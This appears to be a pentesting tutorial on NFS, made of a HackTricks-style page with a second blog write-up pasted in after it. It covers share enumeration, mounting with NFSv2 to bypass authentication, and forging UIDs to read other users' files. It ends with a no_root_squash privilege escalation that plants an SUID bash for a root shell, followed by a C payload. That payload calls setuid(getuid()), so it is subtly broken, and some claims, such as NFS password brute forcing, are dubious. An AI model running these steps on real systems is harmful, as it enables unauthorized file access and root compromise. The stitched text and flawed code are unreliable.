# 2049 - Pentesting NFS Service

## **Basic Information**

**NFS**  is a protocol that provides shared file system services on a computer network. NFS allows a server to share directories and files, which can then be mounted on client machines over the network.
NFS operates on a server-client model, where the server shares file systems and clients can use these shared files.

**Default port**: 2049/TCP/UDP (except version 4, it just needs TCP or UDP).&#x20;

```
2049/tcp open  nfs     2-3 (RPC #100003
```
## Connection
### Connecting to NFS Shares
Mounting NFS shares is typically done using the mount command. For example:
```
mount -t nfs X.X.X.X:/path/to/share /mnt/nfs
```
This command mounts the share located at /path/to/share on the server with IP address X.X.X.X to the /mnt/nfs directory.
## Listing NFS Shares
The showmount command can be used to list the shares on a server:
```
showmount -e X.X.X.X
```
## Enumeration
Discovering NFS Shares
Tools like `Nmap` can be used to discover NFS shares on a target host. For example:
```
nmap -p 2049 X.X.X.X
```
## Exploiting NFS Shares
Mounting NFS shares can reveal sensitive information and potentially lead to unauthorized access if proper access controls are not in place.

### Versions

- **NFSv2**: This version is recognized for its broad compatibility with various systems, marking its significance with initial operations predominantly over UDP. Being the **oldest** in the series, it laid the groundwork for future developments.

- **NFSv3**: Introduced with an array of enhancements, NFSv3 expanded on its predecessor by supporting variable file sizes and offering improved error reporting mechanisms. Despite its advancements, it faced limitations in full backward compatibility with NFSv2 clients.

- **NFSv4**: A landmark version in the NFS series, NFSv4 brought forth a suite of features designed to modernize file sharing across networks. Notable improvements include the integration of Kerberos for **high security**, the capability to traverse firewalls and operate over the Internet without the need for portmappers, support for Access Control Lists (ACLs), and the introduction of state-based operations. Its performance enhancements and the adoption of a stateful protocol distinguish NFSv4 as a pivotal advancement in network file sharing technologies.

Each version of NFS has been developed with the intent to address the evolving needs of network environments, progressively enhancing security, compatibility, and performance.

## Enumeration

### Useful nmap scripts

```bash
nfs-ls #List NFS exports and check permissions
nfs-showmount #Like showmount -e
nfs-statfs #Disk statistics and info from NFS share
```

### Useful metasploit modules

```bash
scanner/nfs/nfsmount #Scan NFS mounts and list permissions
```

### Mounting

To know **which folder** has the server **available** to mount you an ask it using:

```bash
showmount -e <IP>
```

Then mount it using:

```bash
mount -t nfs [-o vers=2] <ip>:<remote_folder> <local_folder> -o nolock
```

You should specify to **use version 2** because it doesn't have **any** **authentication** or **authorization**.

**Example:**

```bash
mkdir /mnt/new_back
mount -t nfs [-o vers=2] 10.12.0.150:/backup /mnt/new_back -o nolock
```

## Permissions

If you mount a folder which contains **files or folders only accesible by some user** (by **UID**). You can **create** **locally** a user with that **UID** and using that **user** you will be able to **access** the file/folder.

## NSFShell

To easily list, mount and change UID and GID to have access to files you can use [nfsshell](https://github.com/NetDirect/nfsshell).

[Nice NFSShell tutorial.](https://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/)

## Config files

```
/etc/exports
/etc/lib/nfs/etab
```
# Attack Vectors
## Unauthorized Access to NFS Shares
Unauthorized access to NFS shares allows an attacker to access and even modify sensitive data over the network. This poses a significant risk if proper authorization is not enforced.

## Compromising NFS Servers
Compromising an NFS server grants an attacker full access to files on the server. This enables access to sensitive data and can even be used as a pivot point to further compromise other devices on the network.

## NFS Brute Force Attacks
Brute force attacks to gain access to NFS servers are a common tactic. When authorization is weak, attackers can use this method to crack passwords and gain access to the server.

# Post-Exploitation
## Permission on NFS Servers
After a successful breach, attackers can gain full access to files on the server. This provides access to sensitive information and can lead to further targeted attacks or data exfiltration.

## Information Exfiltration
Files on NFS servers often contain sensitive information. After a successful attack, retrieving these files and using the information therein allows attackers to further their goals or leak information.

### Dangerous settings

- **Read and Write Permissions (`rw`):** This setting allows both reading from and writing to the file system. It's essential to consider the implications of granting such broad access.

- **Use of Insecure Ports (`insecure`):** When enabled, this allows the system to utilize ports above 1024. The security of ports above this range can be less stringent, increasing risk.

- **Visibility of Nested File Systems (`nohide`):** This configuration makes directories visible even if another file system is mounted below an exported directory. Each directory requires its own export entry for proper management.

- **Root Files Ownership (`no_root_squash`):** With this setting, files created by the root user maintain their original UID/GID of 0, disregarding the principle of least privilege and potentially granting excessive permissions.

- **Non-Squashing of All Users (`no_all_squash`):** This option ensures that user identities are preserved across the system, which could lead to permission and access control issues if not correctly handled.

## Privilege Escalation using NFS misconfigurations

[NFS no\_root\_squash and no\_all\_squash privilege escalation](../linux-hardening/privilege-escalation/nfs-no\_root\_squash-misconfiguration-pe.md)

## HackTricks Automatic Commands

```
Protocol_Name: NFS    #Protocol Abbreviation if there is one.
Port_Number:  2049     #Comma separated if there is more than one.
Protocol_Description: Network File System         #Protocol Abbreviation Spelled out

Entry_1:
  Name: Notes
  Description: Notes for NFS
  Note: |
    NFS is a system designed for client/server that enables users to seamlessly access files over a network as though these files were located within a local directory. 

    #apt install nfs-common
    showmount 10.10.10.180      ~or~showmount -e 10.10.10.180
    should show you available shares (example /home)

    mount -t nfs -o ver=2 10.10.10.180:/home /mnt/
    cd /mnt
    nano into /etc/passwd and change the uid (probably 1000 or 1001) to match the owner of the files if you are not able to get in

    https://book.hacktricks.xyz/pentesting/nfs-service-pentesting

Entry_2:
  Name: Nmap
  Description: Nmap with NFS Scripts
  Command: nmap --script=nfs-ls.nse,nfs-showmount.nse,nfs-statfs.nse -p 2049 {IP}
```
NFS
NFS usually uses ports 111, 2049
What is NFS?
NFS (Network FileSysem) is a very stable and powerful file system for sharing storage devices of UNIX/Linux operating systems. Thanks to NFS; The same files can be accessed from multiple computers. It provides convenience in data storage. Instead of installing to the local disk for each application, it allows applications to be shared.
1
2
	PORT     STATE SERVICE               VERSION
2049/tcp open  nfs    

NFS Pentesting
  Shodan search query :
port:2049
Misconfigured NFS
A lot of data is obtained in file sharing in most of the companies that are tested for network penetration.
NFS Service Detection in Network with Nmap
1
2
	nmap -n -PN -sS -T5 -p 2049 --script=nfs-showmount 10.10.x.x/24
nmap --script=nfs-ls.nse,nfs-showmount.nse,nfs-statfs.nse -p 2049 10.10.x.x

 ![image](https://github.com/user-attachments/assets/46c6dacc-2f18-4dd3-83b6-c7f985d4eebd)

Network NFS Service Detection with Metasploit
1
2
3
	msf > use auxiliary/scanner/nfs/nfsmount
msf auxiliary(nfsmount) > set RHOSTS 10.10.x.x/24
msf auxiliary(nfsmount) > run

 ![image](https://github.com/user-attachments/assets/713a6c2b-a9a2-42c9-9117-778640dbfdf1)

NFS Shares Listing With “showmount”
1
	showmount -e 10.10.x.x

 ![image](https://github.com/user-attachments/assets/4d97a866-1a85-4b56-9d18-79ede612fcea)

Access to discovered NFS shares
1
2
	mount -t nfs 10.10.x.x:/export/home /mnt/connect_path
mount -t nfs -o vers=2 10.10.x.x:/export/home /mnt/connect_path -o nolock # You should specify to use version 2 because it doesn't have any authentication or authorization.

Access to discovered NFS shares with same user UID Permissions
In the terminal we can see the shared arguments and what UID value they belong to a user.
1
	-rwxr----- 1923 1000 1898 example.doc

We see that there is a document. But we may need to open this doc file with a user with an authorized user UID. First of all, let’s unmount the mount we mounted with the unmount command. Then let’s create a user with the same UID value in the local system.
1
	umount /connect_path

Yes, we have unmounted. Now let’s create a user with the same UID value.
1
	useradd newuser

setting the user UID value
1
	usermod -u 1923 newuser

Connecting the share to the local system again after setting the UID value.
1
	mount -t nfs 192.168.x.x:/export/home /home/newuser/Desktop/connect_path

NFS no_root_squash/no_all_squash misconfiguration PE
Read the /etc/exports file, if you find some directory that is configured as no_root_squash, then you can access it from as a client and write inside that directory as if you were the local root of the machine.
no_root_squash: This option basically gives authority to the root user on the client to access files on the NFS server as root. And this can lead to serious security implications.
no_all_squash: This is similar to no_root_squash option but applies to non-root users. Imagine, you have a shell as nobody user; checked /etc/exports file; no_all_squash option is present; check /etc/passwd`{: .filepath} file; emulate a non-root user; create a suid file as that user (by mounting using nfs). Execute the suid as nobody user and become different user.
Privilege Escalation
Remote Exploit
If you have found this vulnerability, you can exploit it:
Mounting that directory in a client machine, and as root copying inside the mounted folder the /bin/bash binary and giving it SUID rights, and executing from the victim machine that bash binary.
1
2
3
4
5
6
7
8
9
10
	#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell

Mounting that directory in a client machine, and as root copying inside the mounted folder our come compiled payload that will abuse the SUID permission, give to it SUID rights, and execute from the victim machine that binary (you can find here some C SUID payloads).
1
2
3
4
5
6
7
8
9
10
	//gcc payload.c -o payload
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main(){
    setuid(getuid());
    system("/bin/bash");
    return 0;
}
